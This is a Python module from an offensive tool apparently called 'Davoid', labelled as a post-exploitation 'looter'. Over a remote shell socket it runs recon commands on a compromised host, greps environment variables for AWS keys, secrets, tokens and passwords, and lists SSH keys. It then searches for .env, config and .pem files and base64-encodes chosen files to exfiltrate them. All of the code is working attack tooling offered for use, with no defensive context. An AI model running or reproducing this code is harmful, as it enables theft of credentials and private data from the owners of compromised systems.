# --- Davoid Core: LOOTER (Post-Exploitation) ---
import time
import os
import base64


def run_looter(sock):
    """
    Automated Intelligence Gathering.
    Executes system recon, network mapping, and credential search.
    """
    results = {}

    # 1. System Identity
    commands = {
        "identity": "whoami && hostname && id",
        "release": "cat /etc/*release",
        "env": "env | grep -E 'AWS|SECRET|TOKEN|PASS'",
        "connections": "netstat -tunapl | grep ESTABLISHED",
        "ssh_keys": "ls -la ~/.ssh/"
    }

    for key, cmd in commands.items():
        try:
            sock.send((cmd + "\n").encode())
            time.sleep(0.5)
            results[key] = sock.recv(4096).decode(
                'utf-8', errors='ignore').strip()
        except:
            results[key] = "Error retrieving data"

    # 2. Search for common config files
    find_cmd = "find . -maxdepth 3 -name '.env' -o -name 'config.json' -o -name '*.pem' 2>/dev/null\n"
    sock.send(find_cmd.encode())
    time.sleep(1)
    results["found_files"] = sock.recv(4096).decode().strip()

    return results


def deep_exfil(sock, target_path):
    """Encodes a file into base64 for safe exfiltration across the shell."""
    cmd = f"cat {target_path} | base64\n"
    sock.send(cmd.encode())
    # Handle incoming stream in Hub
